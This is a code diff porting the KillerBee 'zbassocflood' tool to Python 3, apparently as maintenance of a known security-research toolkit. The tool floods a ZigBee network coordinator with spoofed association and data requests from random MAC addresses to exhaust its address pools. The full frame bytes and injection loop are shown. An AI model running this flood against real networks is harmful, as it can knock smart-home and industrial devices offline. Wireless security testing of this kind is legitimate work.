@@ -8,7 +8,7 @@ from killerbee import *
 
 
 def usage():
-    print >>sys.stderr, """
+    print("""
 zbassocflood: Transmit a flood of associate requests to a target network.
 jwright@willhackforsushi.com
 
@@ -16,13 +16,13 @@ Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]
                         [-s per-packet delay/float]
 
 e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1
-    """
+    """, file=sys.stderr)
 
 def interrupt(signum, frame):
     global kb
     global txcount
     kb.close()
-    print "\nSent %d associate requests."%txcount
+    print("\nSent %d associate requests."%txcount)
     sys.exit(0)
 
 # Watch for an association response
@@ -52,8 +52,8 @@ def watchforaresp(kb, timeout=1):
     kb.sniffer_off()
     return None
 
-if __name__ == '__main__':
 
+if __name__ == '__main__':
     # Command-line arguments
     arg_panid = None
     arg_devstring = None
@@ -64,33 +64,32 @@ if __name__ == '__main__':
     txcount = 0
 
     # Assoc Request
-    assocreq = "\x23\xc8\x41\x0b\xc7\x00\x00\xff" \
-                "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x8e"
+    assocreq = b'\x23\xc8\x41\x0b\xc7\x00\x00\xff' \
+               b'\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x8e'
 
     # Association Request Frame in list form, split where we need to modify
-    assocreqp = [ "\x23\xc8",
-                    "", # Seq num
-                    "", # Dest PANID
-                    "\x00\x00", # Destination (coordinator)
-                    "\xff\xff", # Source PAN (broadcast)
-                    "", # Address field
-                    "\x01\x8e\x67" # Command Frame payload/assoc req
+    assocreqp = [   b'\x23\xc8',
+                    b'', # Seq num
+                    b'', # Dest PANID
+                    b'\x00\x00', # Destination (coordinator)
+                    b'\xff\xff', # Source PAN (broadcast)
+                    b'', # Address field
+                    b'\x01\x8e\x67' # Command Frame payload/assoc req
                 ]
 
     # Data Request Frame in list form, split where we need to modify
-    datareqp = [ "\x63\xc8",   # FC (intra PAN set)
-                    "", # Seq num
-                    "", # Dest PANID
-                    "\x00\x00", # Destination (coordinator)
-                    "", # Source ext address
-                    "\x04" # Command Frame data request
+    datareqp = [    b'\x63\xc8',   # FC (intra PAN set)
+                    b'', # Seq num
+                    b'', # Dest PANID
+                    b'\x00\x00', # Destination (coordinator)
+                    b'', # Source ext address
+                    b'\x04' # Command Frame data request
                 ]
 
     # ACK Frame in list form, split where we need to modify
-    ackp = [ "\x02\x00",    # FC 
-                    ""      # ACK'd seq num
-                ]
-
+    ackp = [b'\x02\x00',    # FC
+            b''             # ACK'd seq num
+            ]
 
     while len(sys.argv) > 1:
         op = sys.argv.pop(1)
@@ -119,10 +118,15 @@ if __name__ == '__main__':
         usage()
         sys.exit(-1)
 
+    if (len(arg_panid) % 2) != 0 or not(arg_panid.startswith('0x')):
+        print("Incorrect format of PANID")
+        usage()
+        sys.exit(-1)
+
     kb = KillerBee(device=arg_devstring)
     signal.signal(signal.SIGINT, interrupt)
 
-    print "zbassocflood: Transmitting and receiving on interface \'%s\'" % kb.get_dev_info()[0]
+    print("zbassocflood: Transmitting and receiving on interface \'%s\'" % kb.get_dev_info()[0])
     
     # Sequence number of assoc frame
     kb.set_channel(arg_channel)
@@ -135,48 +139,48 @@ if __name__ == '__main__':
     # Loop injecting and receiving packets
     seqnum = 0
     ffdswitch = False
-    while 1:
-        if seqnum > 254:                        # 254 to accommodate datareq
+    while True:
+        if seqnum > 254:  # 254 to accommodate datareq
             seqnum = 0
     
         mac = randmac()
 
-        assocreqp[1] = "%c" % seqnum
-        assocreqp[5] = mac
+        assocreqp[1] = b'%c' % seqnum
+        assocreqp[5] = mac.encode()
+
         # Per Ben Ramsey's contribution 9/20/12, rmspeers has:
         # Alternate requests as an FFD or RFD to exhaust both address pools
         ffdswitch = not ffdswitch
         if ffdswitch:
-            assocreqp[6] = "\x01\x8e\x67"  # Full Function Device (FFD)
+            assocreqp[6] = b'\x01\x8e\x67'  # Full Function Device (FFD)
         else:
-            assocreqp[6] = "\x01\x8c\x67"  # Reduced Function Device (RFD)
+            assocreqp[6] = b'\x01\x8c\x67'  # Reduced Function Device (RFD)
 
-        assocreqinj = ''.join(assocreqp)
+        assocreqinj = b''.join(assocreqp)
 
         seqnum += 1
-        datareqp[1] = "%c" % seqnum
-        datareqp[4] = mac
-        datareqinj = ''.join(datareqp)
+        datareqp[1] = b'%c' % seqnum
+        datareqp[4] = mac.encode()
+        datareqinj = b''.join(datareqp)
 
         try:
             # Send the associate request frame
             kb.inject(assocreqinj)
-            time.sleep(0.05) # Delay between assoc and data requests
+            time.sleep(0.05)  # Delay between assoc and data requests
 
             # Send the data request frame
             kb.inject(datareqinj)
-        except Exception, e:
-            print "ERROR: Unable to inject packet"
-            print e
+        except Exception as e:
+            print("ERROR: Unable to inject packet")
+            print(e)
             sys.exit(-1)
 
         try:
             # Listen for the ACK response
             seq = watchforaresp(kb, arg_framedelay*10)
-        except Exception, e:
-            print e
-            print "ERROR: Unable to handle response processing."
-            print e
+        except Exception as e:
+            print("ERROR: Unable to handle response processing.")
+            print(e)
             sys.exit(-1)
 
         try:
@@ -192,9 +196,9 @@ if __name__ == '__main__':
 
             txcount+=1
             time.sleep(arg_framedelay)
-        except Exception, e:
-            print "ERROR: Unable to handle ACK response."
-            print e
+        except Exception as e:
+            print("ERROR: Unable to handle ACK response.")
+            print(e)
             sys.exit(-1)
 
         seqnum += 1
